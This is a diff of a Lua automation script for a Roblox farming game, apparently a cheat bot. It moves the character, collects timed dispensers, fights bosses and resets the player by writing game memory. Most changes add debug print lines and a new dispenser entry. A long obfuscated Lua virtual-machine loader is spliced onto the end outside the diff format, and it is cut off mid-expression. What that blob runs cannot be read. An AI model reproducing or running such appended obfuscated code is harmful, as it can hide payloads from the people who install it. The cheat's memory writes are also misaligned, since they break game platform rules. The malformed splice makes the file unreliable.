@@ -5658,7 +5645,7 @@ function UI:StartCoconutCrab()
             end
         end
         
-
+        print("Initial Coconut Crab count: " .. initialCrabCount)
         
         while self.killCoconutCrab and self.coconutCrabRunning do
             local player = game.Players.LocalPlayer
@@ -5700,13 +5687,13 @@ function UI:StartCoconutCrab()
                 end
             end
             
-
+            print("Crab check: Current=" .. currentCrabCount .. " | Initial=" .. initialCrabCount)
             
             if currentCrabCount > initialCrabCount then
                 self.status = "Fighting Coconut Crab (" .. currentCrabCount .. ")"
                 self.needsRedraw = true
                 
-
+                print("New crab detected! Waiting for kill...")
                 
                 local lastCrabCheck = os.clock()
                 local loopCount = 0
@@ -5731,17 +5718,17 @@ function UI:StartCoconutCrab()
                             end
                         end
                         lastCrabCheck = os.clock()
-
+                        print("Crab recount: " .. currentCrabCount .. " (loop #" .. loopCount .. ")")
                     end
                     
                     wait(0.03)
                 end
                 
-
+                print("Crab killed!")
                 
                 initialCrabCount = currentCrabCount
             else
-
+                print("No new crab, going straight to farming")
             end
             
             self.status = "Going to Coconut Field"
@@ -5763,7 +5750,7 @@ function UI:StartCoconutCrab()
                         self.status = "Farming Coconut Field (30s)"
                         self.needsRedraw = true
                         
-
+                        print("Farming Coconut Field for 30 seconds...")
                         
                         local farmStartTime = os.clock()
                         local recentTokens = {}
@@ -5855,7 +5842,7 @@ function UI:StartCoconutCrab()
                             wait(0.05)
                         end
                         
-
+                        print("Finished farming Coconut Field, looping back...")
                         StopWalking()
                     end
                 end
@@ -5881,7 +5868,7 @@ end
 
 function UI:StartTrainSnail()
     if self.trainSnailRunning then
-
+        print("Train Snail already running!")
         return
     end
     self.trainSnailRunning = true
@@ -5912,7 +5899,7 @@ function UI:StartTrainSnail()
                 
                 local stumpField = flowerZones:FindFirstChild("Stump Field")
                 if not stumpField then
-
+                    print("ERROR: Stump Field not found")
                     wait(5)
                     return
                 end
@@ -6007,7 +5994,7 @@ function UI:StartTrainSnail()
             end)
             
             if not success then
-
+                print("ERROR in Train Snail: " .. tostring(err))
                 wait(2)
             end
             
@@ -6030,7 +6017,7 @@ end
 
 function UI:StartFarmPuppyBall()
     if self.farmPuppyBallRunning then
-
+        print("Farm Puppy Ball already running!")
         return
     end
     
@@ -6071,9 +6058,9 @@ function UI:StartFarmPuppyBall()
                         if tennisBall then
                             ballPos = tennisBall.Position
                             WalkTo(ballPos)
-
+                            print("Updated ball position: " .. tostring(ballPos))
                         else
-
+                            print("Ball despawned during walk")
                             StopWalking()
                             break
                         end
@@ -6082,7 +6069,7 @@ function UI:StartFarmPuppyBall()
                     
                     -- Timeout check
                     if os.clock() - walkStartTime > 10 then
-
+                        print("Walk timeout")
                         StopWalking()
                         break
                     end
@@ -6096,7 +6083,7 @@ function UI:StartFarmPuppyBall()
                         local distSquared = dx * dx + dz * dz
                         
                         if distSquared < 25 then
-
+                            print("Arrived at ball!")
                             StopWalking()
                             break
                         end
@@ -6109,7 +6096,7 @@ function UI:StartFarmPuppyBall()
             end)
             
             if not success then
-
+                print("ERROR in Farm Puppy Ball: " .. tostring(err))
                 wait(2)
             end
             
@@ -6131,17 +6118,25 @@ end
 -- ============================================================
 
 UI.dispenserConfig = {
+    wealthClock = {
+        name = "Wealth Clock",
+        interval = 3600,
+        position = Vector3.new(329, 58, 191),
+        key = 0x45,
+        waitAfterPress = 1,
+        enabled = function(self) return self.collectWealthClock end
+    },
     coconutDispenser = {
         name = "Coconut Dispenser",
-        interval = 14400,  -- 4 hours
+        interval = 14400,
         position = Vector3.new(-177, 73, 533),
-        key = 0x45,  -- E key
+        key = 0x45,
         waitAfterPress = 1,
         enabled = function(self) return self.collectCoconutDispenser end
     },
     antPass = {
         name = "Ant Pass",
-        interval = 10800,  -- 3 hours
+        interval = 10800,
         position = Vector3.new(125, 32, 495),
         key = 0x45,
         waitAfterPress = 1,
@@ -6149,7 +6144,7 @@ UI.dispenserConfig = {
     },
     honeyStorm = {
         name = "Honey Storm",
-        interval = 14400,  -- 4 hours
+        interval = 14400,
         position = Vector3.new(233, 34, 163),
         key = 0x45,
         waitAfterPress = 1,
@@ -6157,16 +6152,16 @@ UI.dispenserConfig = {
     },
     glue = {
         name = "Glue",
-        interval = 3600,  -- 1 hour
+        interval = 3600,
         position = Vector3.new(15, 92, 489),
-        key = 0x32,  -- 2 key
+        key = 0x32,
         waitAfterPress = 2,
         specialHandling = "glue",
         enabled = function(self) return self.collectGlue end
     },
     honeyDispenser = {
         name = "Honey Dispenser",
-        interval = 3600,  -- 1 hour
+        interval = 3600,
         position = Vector3.new(46, 5, 321),
         key = 0x45,
         waitAfterPress = 1,
@@ -6174,7 +6169,7 @@ UI.dispenserConfig = {
     },
     blueberryDispenser = {
         name = "Blueberry Dispenser",
-        interval = 14400,  -- 4 hours
+        interval = 14400,
         position = Vector3.new(308, 4, 135),
         key = 0x45,
         waitAfterPress = 1,
@@ -6182,7 +6177,7 @@ UI.dispenserConfig = {
     },
     treatDispenser = {
         name = "Treat Dispenser",
-        interval = 3600,  -- 1 hour
+        interval = 3600,
         position = Vector3.new(193, 68, -124),
         key = 0x45,
         waitAfterPress = 1,
@@ -6190,7 +6185,7 @@ UI.dispenserConfig = {
     },
     strawberryDispenser = {
         name = "Strawberry Dispenser",
-        interval = 3600,  -- 1 hour
+        interval = 3600,
         position = Vector3.new(-321, 46, 270),
         key = 0x45,
         waitAfterPress = 1,
@@ -6198,7 +6193,7 @@ UI.dispenserConfig = {
     },
     royalJellyDispenser = {
         name = "Royal Jelly Dispenser",
-        interval = 79200,  -- 22 hours
+        interval = 79200,
         position = Vector3.new(130, 65, 334),
         key = 0x45,
         waitAfterPress = 1,
@@ -6206,7 +6201,7 @@ UI.dispenserConfig = {
     },
     roboPassDispenser = {
         name = "Robo Pass Dispenser",
-        interval = 79200,  -- 22 hours
+        interval = 79200,
         position = Vector3.new(-92, 183, -298),
         key = 0x45,
         waitAfterPress = 1,
@@ -6216,24 +6211,28 @@ UI.dispenserConfig = {
 
 function UI:CollectDispenser(dispenserKey)
     local config = self.dispenserConfig[dispenserKey]
+        -- Wealth Clock special handling: print debug if called
+        if dispenserKey == "wealthClock" then
+            print("[DEBUG] Collecting Wealth Clock...")
+        end
     if not config then
-
+        print("ERROR: Invalid dispenser key: " .. dispenserKey)
         return false
     end
     
-
+    print("=== COLLECTING " .. config.name:upper() .. " ===")
     
     local player = game.Players.LocalPlayer
     local character = player.Character
     
     if not character then
-
+        print("ERROR: No character for " .. config.name)
         return false
     end
     
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then
-
+        print("ERROR: No HRP for " .. config.name)
         return false
     end
     
@@ -6249,7 +6248,7 @@ function UI:CollectDispenser(dispenserKey)
     self.status = "Going to " .. config.name
     self.needsRedraw = true
     
-
+    print("Tweening to " .. config.name .. "...")
     self:QueueTween(hrp, config.position, true)
     
     local maxWaitTime = 60
@@ -6257,14 +6256,14 @@ function UI:CollectDispenser(dispenserKey)
     
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > maxWaitTime then
-
+            print("ERROR: " .. config.name .. " tween timeout!")
             self:ClearTweenQueue()
             break
         end
         wait(0.1)
     end
     
-
+    print("✓ Arrived at " .. config.name)
     wait(0.5)
     
     -- Wait for Roblox to be active
@@ -6281,7 +6280,7 @@ function UI:CollectDispenser(dispenserKey)
         
         -- Special handling for glue (needs to place sprinkler first)
         if config.specialHandling == "glue" then
-
+            print("Placing glue sprinkler (pressing 2)...")
             keypress(config.key)
             wait(0.1)
             keyrelease(config.key)
@@ -6291,35 +6290,37 @@ function UI:CollectDispenser(dispenserKey)
             hrp = character:FindFirstChild("HumanoidRootPart")
             if hrp then
                 local playerY = hrp.Position.Y
-
+                print("Player Y level: " .. string.format("%.1f", playerY))
                 
                 if playerY > 10000 then
-
+                    print("Y level > 10k, tweening to glue collection area...")
                     self.status = "Going to Glue Collection Area"
                     self.needsRedraw = true
-                    
                     local glueCollectionPos = Vector3.new(270, 25257, -722)
                     self:QueueTween(hrp, glueCollectionPos, true)
-                    
                     local startWait = os.clock()
                     while self.processingTween and self.autoFarmEnabled do
                         if os.clock() - startWait > 60 then
-
+                            print("ERROR: Glue collection area tween timeout!")
                             self:ClearTweenQueue()
                             break
                         end
                         wait(0.1)
                     end
-                    
-
+                    print("✓ Arrived at glue collection area")
+                    wait(1)
+                    -- Press E to collect glue, like other dispensers
+                    keypress(0x45)  -- E key
+                    wait(0.1)
+                    keyrelease(0x45)
                     wait(1)
                 else
-
+                    print("Y level < 10k, skipping glue tween")
                 end
             end
             
             -- LAST STEP: Kill player (works for both high and low level)
-
+            print("Resetting player after glue...")
             self.status = "Resetting Player"
             self.needsRedraw = true
             
@@ -6330,39 +6331,39 @@ function UI:CollectDispenser(dispenserKey)
                     local addr = humanoid.Address
                     local v = Vector3.new(0, 0, 0)
                     memory_write("float", addr + 0x18C + 8, v.Z)
-
+                    print("✓ Reset initiated")
                     
                     -- Wait for respawn
                     local respawned = WaitForRespawn(30)
                     
                     if respawned then
-
+                        print("✓ Respawned successfully after glue")
                         self.status = "Waiting for bees..."
                         self.needsRedraw = true
                         wait(15)  -- Wait for bees
                     else
-
+                        print("ERROR: Failed to respawn after glue")
                     end
                 else
-
+                    print("ERROR: Could not reset player - no humanoid address")
                 end
             end
             
         else
             -- Normal dispenser collection
-
+            print("Pressing key to collect " .. config.name .. "...")
             keypress(config.key)
             wait(0.1)
             keyrelease(config.key)
             wait(config.waitAfterPress)
         end
         
-
+        print("✓ " .. config.name .. " collected!")
     end
     
     -- Return to field
     if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then
-
+        print("Returning to " .. self.selectedOption)
         self.status = "Returning to Field"
         self.needsRedraw = true
         
@@ -6380,14 +6381,14 @@ function UI:CollectDispenser(dispenserKey)
                         local startWait = os.clock()
                         while self.processingTween and self.autoFarmEnabled do
                             if os.clock() - startWait > 60 then
-
+                                print("ERROR: Return to field timeout!")
                                 self:ClearTweenQueue()
                                 break
                             end
                             wait(0.1)
                         end
                         
-
+                        print("✓ Returned to field")
                     end
                 end
             end
@@ -6447,7 +6448,7 @@ function UI:StartTimedActionsHandler()
                     
                     if currentTime - self[timerKey] >= config.interval then
                         if self.autoFarmEnabled then
-
+                            print("=== " .. config.name:upper() .. " TIMER TRIGGERED ===")
                             self:CollectDispenser(key)
                             self[timerKey] = currentTime
                         end
@@ -6462,7 +6463,7 @@ function UI:StartTimedActionsHandler()
             if self.killTunnelBear then
                 if currentTime - self.lastTunnelBearTime >= 172800 then
                     if self.autoFarmEnabled then
-
+                        print("=== TUNNEL BEAR TIMER TRIGGERED ===")
                         local success = self:FightTunnelBear()
                         if success then
                             self.lastTunnelBearTime = currentTime
@@ -6482,7 +6483,7 @@ function UI:StartTimedActionsHandler()
                 
                 if currentTime - self.lastKingBeetleTime >= 86400 then
                     if self.autoFarmEnabled then
-
+                        print("=== KING BEETLE TIMER TRIGGERED ===")
                         local success = self:KillKingBeetle()
                         if success then
                             self.lastKingBeetleTime = currentTime
@@ -6498,7 +6499,7 @@ function UI:StartTimedActionsHandler()
             if self.killCommandoChick then
                 if currentTime - self.lastCommandoChickTime >= 1800 then
                     if self.autoFarmEnabled then
-
+                        print("=== COMMANDO CHICK TIMER TRIGGERED ===")
                         self:FightCommandoChick()
                         self.lastCommandoChickTime = currentTime
                     end
@@ -6508,7 +6509,7 @@ function UI:StartTimedActionsHandler()
             wait(10)
         end
         
-
+        print("Timed actions handler stopped")
         self.timedActionsThread = nil
     end)
 end
@@ -6719,19 +6720,19 @@ function UI:CheckKingBeetle()
 end
 
 function UI:KillKingBeetle()
-
+    print("=== KING BEETLE AUTO-FARM ===")
     
     local player = game.Players.LocalPlayer
     local character = player.Character
     
     if not character then
-
+        print("ERROR: No character for King Beetle")
         return false
     end
     
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then
-
+        print("ERROR: No HRP for King Beetle")
         return false
     end
     
@@ -6749,7 +6750,7 @@ function UI:KillKingBeetle()
     
     local checkPos = Vector3.new(218, 4, 140)
     
-
+    print("Tweening to King Beetle check location...")
     self:QueueTween(hrp, checkPos, true)
     
     local maxWaitTime = 60
@@ -6757,21 +6758,21 @@ function UI:KillKingBeetle()
     
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > maxWaitTime then
-
+            print("ERROR: King Beetle check tween timeout!")
             self:ClearTweenQueue()
             break
         end
         wait(0.1)
     end
     
-
+    print("Arrived at check location, checking for King Beetle...")
     wait(1)
     
     if not self:CheckKingBeetle() then
-
+        print("King Beetle not spawned, returning to farming")
         self.lastKingBeetleTime = os.clock()
         if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then
-
+            print("Returning to " .. self.selectedOption)
             self.status = "Returning to Field"
             self.needsRedraw = true
             
@@ -6789,14 +6790,14 @@ function UI:KillKingBeetle()
                             local startWait = os.clock()
                             while self.processingTween and self.autoFarmEnabled do
                                 if os.clock() - startWait > 60 then
-
+                                    print("ERROR: Return to field timeout!")
                                     self:ClearTweenQueue()
                                     break
                                 end
                                 wait(0.1)
                             end
                             
-
+                            print("Returned to field")
                         end
                     end
                 end
@@ -6811,18 +6812,18 @@ function UI:KillKingBeetle()
         return false
     end
     
-
+    print("King Beetle spawned! Starting fight sequence...")
     self.status = "Fighting King Beetle"
     self.needsRedraw = true
     
     local waypoint1 = Vector3.new(108, 4, 169)
-
+    print("Walking to waypoint 1...")
     self:QueueTween(hrp, waypoint1, true)
     
     startWait = os.clock()
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > 60 then
-
+            print("ERROR: Waypoint 1 timeout!")
             self:ClearTweenQueue()
             break
         end
@@ -6832,42 +6833,42 @@ function UI:KillKingBeetle()
     wait(0.5)
     
     local waypoint2 = Vector3.new(109, 4, 253)
-
+    print("Walking to waypoint 2...")
     self:QueueTween(hrp, waypoint2, true)
     
     startWait = os.clock()
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > 60 then
-
+            print("ERROR: Waypoint 2 timeout!")
             self:ClearTweenQueue()
             break
         end
         wait(0.1)
     end
     
-
+    print("Waiting at waypoint 2, checking for King Beetle...")
     wait(1)
     
     local checkStartTime = os.clock()
     while self.autoFarmEnabled and self:CheckKingBeetle() do
         if os.clock() - checkStartTime > 300 then
-
+            print("King Beetle timeout (5 minutes)")
             break
         end
         wait(0.5)
     end
     
     if self.autoFarmEnabled then
-
+        print("King Beetle defeated!")
         
         local collectPos = Vector3.new(182, 4, 180)
-
+        print("Walking to collection point...")
         self:QueueTween(hrp, collectPos, true)
         
         startWait = os.clock()
         while self.processingTween and self.autoFarmEnabled do
             if os.clock() - startWait > 60 then
-
+                print("ERROR: Collection point timeout!")
                 self:ClearTweenQueue()
                 break
             end
@@ -6876,7 +6877,7 @@ function UI:KillKingBeetle()
         
         wait(0.5)
         
-
+        print("Collecting tokens for 15 seconds...")
         self.status = "Collecting King Beetle Tokens"
         self.needsRedraw = true
         
@@ -6971,12 +6972,12 @@ function UI:KillKingBeetle()
         end
         
         StopWalking()
-
-
+        print("Token collection complete!")
+        print("Next King Beetle in 24 hours")
     end
     
     if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then
-
+        print("Returning to " .. self.selectedOption)
         self.status = "Returning to Field"
         self.needsRedraw = true
         
@@ -6994,14 +6995,14 @@ function UI:KillKingBeetle()
                         local startWait = os.clock()
                         while self.processingTween and self.autoFarmEnabled do
                             if os.clock() - startWait > 60 then
-
+                                print("ERROR: Return to field timeout!")
                                 self:ClearTweenQueue()
                                 break
                             end
                             wait(0.1)
                         end
                         
-
+                        print("Returned to field")
                     end
                 end
             end
@@ -7017,19 +7018,19 @@ function UI:KillKingBeetle()
 end
 
 function UI:FightCommandoChick()
-
+    print("=== FIGHTING COMMANDO CHICK ===")
     
     local player = game.Players.LocalPlayer
     local character = player.Character
     
     if not character then
-
+        print("ERROR: No character for Commando Chick")
         return false
     end
     
     local hrp = character:FindFirstChild("HumanoidRootPart")
     if not hrp then
-
+        print("ERROR: No HRP for Commando Chick")
         return false
     end
     
@@ -7051,7 +7052,7 @@ function UI:FightCommandoChick()
     -- Tween to Commando Chick spawn location
     local commandoPos = Vector3.new(476, 46, 203)
     
-
+    print("Tweening to Commando Chick spawn area...")
     self:QueueTween(hrp, commandoPos, true)
     
     -- Wait for tween to complete
@@ -7060,23 +7061,23 @@ function UI:FightCommandoChick()
     
     while self.processingTween and self.autoFarmEnabled do
         if os.clock() - startWait > maxWaitTime then
-
+            print("ERROR: Commando Chick tween timeout!")
             self:ClearTweenQueue()
             break
         end
         wait(0.1)
     end
     
-
+    print("Arrived at Commando Chick area, waiting 3 seconds for spawn...")
     wait(3)
     
     -- Check if Commando Chick spawned
     if not self:CheckForCommandoChick() then
-
+        print("Commando Chick did not spawn, returning to farming")
         
         -- Return to field
         if self.autoFarmEnabled and previousField and previousField ~= "Select Field..." then
-
+            print("Returning to " .. previousField)
             self.status = "Returning to Field"
             self.needsRedraw = true
             
@@ -7094,14 +7095,14 @@ function UI:FightCommandoChick()
                             local startWait = os.clock()
                             while self.processingTween and self.autoFarmEnabled do
                                 if os.clock() - startWait > 60 then
-
+                                    print("ERROR: Return to field timeout!")
                                     self:ClearTweenQueue()
                                     break
                                 end
                                 wait(0.1)
                             end
                             
-
+                            print("✓ Returned to field")
                         end
                     end
                 end
@@ -7117,7 +7118,7 @@ function UI:FightCommandoChick()
         return false
     end
     
-
+    print("=== COMMANDO CHICK SPAWNED! ===")
     self.status = "Fighting Commando Chick"
     self.needsRedraw = true
     
@@ -7187,12 +7188,12 @@ function UI:FightCommandoChick()
         wait(0.5)
     end
     
-
-
+    print("✓ Commando Chick defeated!")
+    print("Next Commando Chick in 30 minutes")
     
     -- Return to field
     if self.autoFarmEnabled and previousField and previousField ~= "Select Field..." then
-
+        print("Returning to " .. previousField)
         self.status = "Returning to Field"
         self.needsRedraw = true
         
@@ -7210,14 +7211,14 @@ function UI:FightCommandoChick()
                         local startWait = os.clock()
                         while self.processingTween and self.autoFarmEnabled do
                             if os.clock() - startWait > 60 then
-
+                                print("ERROR: Return to field timeout!")
                                 self:ClearTweenQueue()
                                 break
                             end
                             wait(0.1)
                         end
                         
-
+                        print("✓ Returned to field")
                     end
                 end
             end
@@ -7328,7 +7329,6 @@ local function StartControlCheck()
 end
 
 StartControlCheck()
-
 UI:Render()
 UI:StartStatusUpdater()
 spawn(function()
@@ -7340,6 +7340,6 @@ spawn(function()
         wait(0.03)
     end
     UI:Clear()
-
+    print("Complete")
 end)
 local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v89=v2(v0(v30,16));if v19 then local v110=v5(v89,v19);v19=nil;return v110;else return v89;end end end);local function v20(v31,v32,v33) if v33 then local v90=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-1) -(v32-((879 -(282 + 595)) -(1638 -(1523 + 114))))) + (620 -(555 + 64)))) ;return v90-(v90%(932 -(857 + 74))) ;else local v91=0;local v92;while true do if (v91==((511 + 57) -(367 + (286 -85)))) then v92=(929 -(214 + 713))^(v32-(1 + 0)) ;return (((v31%(v92 + v92))>=v92) and (1 + (1065 -(68 + 997)))) or 0 ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=(2347 -1077) -(226 + 1044) ;local v36;local v37;while true do if (v35==(4 -3)) then return (v37 * (373 -(32 + 85))) + v36 ;end if (v35==(0 + 0)) then v36,v37=v1(v16,v18,v18 + 1 + 1 );v18=v18 + (959 -((1637 -745) + 65)) ;v35=2 -1 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (353 -(87 + 263)) );v18=v18 + (184 -(67 + 113)) ;return (v41 * (12302277 + 4474939)) + (v40 * 65536) + (v39 * (628 -(274 + 98))) + v38 ;end local function v24() local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(953 -(802 + 150))) then v45=2 -1 ;v46=(v20(v44,1 -0 ,15 + 5 ) * (2^(1029 -(915 + 82)))) + v43 ;v42=5 -3 ;end if (v42==(2 + 1)) then if (v47==(0 -(1486 -(998 + 488)))) then if (v46==(1187 -(1069 + 118))) then return v48 * (0 -0) ;else local v122=0 -0 ;while true do if (v122==(0 + 0 + 0)) then v47=1;v45=0 -0 ;break;end end end elseif (v47==(2031 + 14 + 2)) then return ((v46==0) and (v48 * ((792 -(368 + 423))/0))) or (v48 * NaN) ;end return v8(v48,v47-(3214 -2191) ) * (v45 + (v46/((20 -(10 + 8))^(824 -(201 + 571))))) ;end if (v42==(0 -0)) then v43=v23();v44=v23();v42=443 -(416 + 26) ;end if (v42==(6 -(1142 -(116 + 1022)))) then v47=v20(v44,10 + 11 ,31);v48=((v20(v44,56 -24 )==1) and  -1) or ((1827 -1388) -(145 + 293)) ;v42=433 -(44 + 386) ;end end end local function v25(v49) local v50;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;local v51={};for v67=1, #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100,v101) local v102=(function() return 0;end)();local v93=(function() return;end)();local v94=(function() return;end)();while true do if (v102==0) then local v117=(function() return 1763 -(454 + 1309) ;end)();local v118=(function() return;end)();while true do if (v117==0) then v118=(function() return 0 + 0 ;end)();while true do if (v118==(0 -0)) then v93=(function() return 0;end)();v94=(function() return nil;end)();v118=(function() return 1;end)();end if (v118~=1) then else v102=(function() return 1 -0 ;end)();break;end end break;end end end if (v102~=1) then else local v119=(function() return 0 -0 ;end)();while true do if (v119~=(285 -(134 + 151))) then else while true do if (v93~=(1665 -(970 + 695))) then else v94=(function() return v95();end)();if (v96(v94, #"{", #"\\")~=(0 -0)) then else local v125=(function() return 0;end)();local v126=(function() return;end)();local v127=(function() return;end)();local v128=(function() return;end)();local v129=(function() return;end)();while true do if (1==v125) then local v159=(function() return 1990 -(582 + 1408) ;end)();while true do if (v159==(0 -0)) then v128=(function() return nil;end)();v129=(function() return nil;end)();v159=(function() return 1;end)();end if (v159==1) then v125=(function() return 2;end)();break;end end end if (v125==0) then v126=(function() return 0 -0 ;end)();v127=(function() return nil;end)();v125=(function() return 3 -2 ;end)();end if (v125~=(1826 -(1195 + 629))) then else while true do if (v126~= #"~") then else local v429=(function() return 0;end)();local v430=(function() return;end)();while true do if (v429==(0 -0)) then v430=(function() return 0;end)();while true do if (v430~=(241 -(187 + 54))) then else v129=(function() return {v97(),v97(),nil,nil};end)();if (v127==(0 + 0)) then local v606=(function() return 0 + 0 ;end)();local v607=(function() return;end)();while true do if (v606~=(0 -0)) then else v607=(function() return 0;end)();while true do if (v607==(0 -0)) then v129[ #"-19"]=(function() return v97();end)();v129[ #"asd1"]=(function() return v97();end)();break;end end break;end end elseif (v127== #"!") then v129[ #"91("]=(function() return v98();end)();elseif (v127==(1 + 1)) then v129[ #"91("]=(function() return v98() -(2^16) ;end)();elseif (v127~= #"xxx") then else local v617=(function() return 0;end)();local v618=(function() return;end)();while true do if (v617==0) then v618=(function() return 1636 -(1373 + 263) ;end)();while true do if ((1000 -(451 + 549))~=v618) then else v129[ #"-19"]=(function() return v98() -((1 + 1)^16) ;end)();v129[ #"xnxx"]=(function() return v97();end)();break;end end break;end end end v430=(function() return 1 -0 ;end)();end if (1==v430) then v126=(function() return 2 -0 ;end)();break;end end break;end end end if (v126== #"91(") then if (v96(v128, #"asd", #"xxx")== #"~") then v129[ #"0313"]=(function() return v99[v129[ #".dev"]];end)();end v100[v101]=(function() return v129;end)();break;end if (v126==(1386 -(746 + 638))) then local v432=(function() return 0 + 0 ;end)();local v433=(function() return;end)();while true do if (v432~=0) then else v433=(function() return 0 -0 ;end)();while true do if (v433~=1) then else v126=(function() return  #"91(";end)();break;end if ((341 -(218 + 123))==v433) then if (v96(v128, #".", #"~")~= #"!") then else v129[1583 -(1535 + 46) ]=(function() return v99[v129[2]];end)();end if (v96(v128,2,2 + 0 )~= #">") then else v129[ #"-19"]=(function() return v99[v129[ #"asd"]];end)();end v433=(function() return 1 + 0 ;end)();end end break;end end end if (v126~=(560 -(306 + 254))) then else local v434=(function() return 0;end)();local v435=(function() return;end)();while true do if (v434==(0 + 0)) then v435=(function() return 0 -0 ;end)();while true do if (v435==(1467 -(899 + 568))) then v127=(function() return v96(v94,2 + 0 , #"xxx");end)();v128=(function() return v96(v94, #"asd1",14 -8 );end)();v435=(function() return 604 -(268 + 335) ;end)();end if ((291 -(60 + 230))~=v435) then else v126=(function() return  #"{";end)();break;end end break;end end end end break;end end end break;end end return v93,v94,v95,v96,v97,v98,v99,v100,v101;end end end end end;end)();local v53=(function() return function(v103,v104,v105) local v106=(function() return 0;end)();local v107=(function() return;end)();while true do if (v106~=(572 -(426 + 146))) then else v107=(function() return 0 + 0 ;end)();while true do if (v107~=0) then else local v123=(function() return 0;end)();while true do if (v123~=0) then else v103[v104-#"<" ]=(function() return v105();end)();return v103,v104,v105;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"{",v58 do local v70=(function() return 0;end)();local v71=(function() return;end)();local v72=(function() return;end)();while true do if (v70==(812 -(569 + 242))) then if (v71== #"}") then v72=(function() return v21()~=(0 -0) ;end)();elseif (v71==2) then v72=(function() return v24();end)();elseif (v71== #"xxx") then v72=(function() return v25();end)();end v59[v69]=(function() return v72;end)();break;end if (v70==(0 + 0)) then local v112=(function() return 1024 -(706 + 318) ;end)();while true do if (v112~=1) then else v70=(function() return 1;end)();break;end if (v112==0) then v71=(function() return v21();end)();v72=(function() return nil;end)();v112=(function() return 1252 -(721 + 530) ;end)();end end end end end v57[ #"xnx"]=(function() return v21();end)();for v73= #"{",v23() do FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v59,v54,v73=(function() return v52(FlatIdent_1076E,Descriptor,v21,v20,v22,v23,v59,v54,v73);end)();end for v74= #"]",v23() do v55,v74,v28=(function() return v53(v55,v74,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[1272 -(945 + 326) ];local v65=v61[4 -2 ];local v66=v61[3 + 0 ];return function(...) local v75=v64;local v76=v65;local v77=v66;local v78=v27;local v79=1;local v80= -(701 -(271 + 429));local v81={};local v82={...};local v83=v12("#",...) -(1501 -(1408 + 92)) ;local v84={};local v85={};for v108=0,v83 do if ((v108>=v77) or (4914<2480)) then v81[v108-v77 ]=v82[v108 + ((1384 -(36 + 261)) -(461 + 625)) ];else v85[v108]=v82[v108 + ((2253 -964) -(993 + 295)) ];end end local v86=(v83-v77) + 1 + 0 ;local v87;local v88;while true do local v109=1171 -(418 + 753) ;while true do if (v109==(0 + 0)) then v87=v75[v79];v88=v87[1 + 0 ];v109=1;end if ((v109==(1 + 0)) or (1559==1240)) then if ((v88<=(7 + 19)) or (2107<906)) then if ((566==566) and (4176<=4914) and (v88<=(541 -((1774 -(34 + 1334)) + 123)))) then if ((3921>=3009) and (v88<=5)) then if (v88<=(1771 -(1749 + 8 + 12))) then if ((v88<=0) or (2244>3452)) then local v130=v87[2];local v131=v85[v130];local v132=v85[v130 + 1 + 0 + 1 ];if ((2063>=1648) and (v132>(1322 -(1249 + 73)))) then if (v131>v85[v130 + 1 ]) then v79=v87[2 + 1 ];else v85[v130 + (1148 -(466 + 679)) ]=v131;end elseif (v131<v85[v130 + (2 -1) ]) then v79=v87[8 -5 ];else v85[v130 + (1903 -(106 + 1794)) ]=v131;end elseif (v88>(1284 -(1035 + 248))) then local v161;v161=v87[1 + 1 ];v85[v161]=v85[v161](v13(v85,v161 + 1 + 0 ,v87[8 -5 ]));v79=v79 + (2 -1) ;v87=v75[v79];v85[v87[116 -(4 + 110) ]][v87[587 -((78 -(20 + 1)) + 527) ]]=v85[v87[1431 -(41 + 1386) ]];v79=v79 + 1 ;v87=v75[v79];v85[v87[105 -(9 + 8 + 86) ]]=v85[v87[3 + 0 ]];v79=v79 + (1 -0) ;v87=v75[v79];v85[v87[5 -3 ]]=v87[3];v79=v79 + (167 -(122 + 44)) ;v87=v75[v79];v85[v87[2 -0 ]]=v87[9 -6 ];v79=v79 + 1 + 0 ;v87=v75[v79];v161=v87[1 + 1 ];v85[v161]=v85[v161](v13(v85,v161 + (1 -0) ,v87[3]));v79=v79 + (66 -(30 + 35)) ;v87=v75[v79];v85[v87[(321 -(134 + 185)) + 0 ]][v87[1260 -(1043 + (1347 -(549 + 584))) ]]=v85[v87[15 -11 ]];v79=v79 + (1213 -(323 + 889)) ;v87=v75[v79];v85[v87[5 -3 ]]=v85[v87[583 -(361 + 219) ]];v79=v79 + (686 -(314 + 371)) ;v87=v75[v79];v85[v87[322 -(53 + 267) ]]=v87[3];v79=v79 + 1 + 0 ;v87=v75[v79];v85[v87[6 -4 ]]=v87[416 -(15 + 398) ];else local v179=v87[984 -(18 + (1932 -(478 + 490))) ];local v180,v181=v78(v85[v179](v85[v179 + (3 -2) ]));v80=(v181 + v179) -(1 + 0 + 0) ;local v182=0 + 0 ;for v408=v179,v80 do v182=v182 + (851 -(20 + 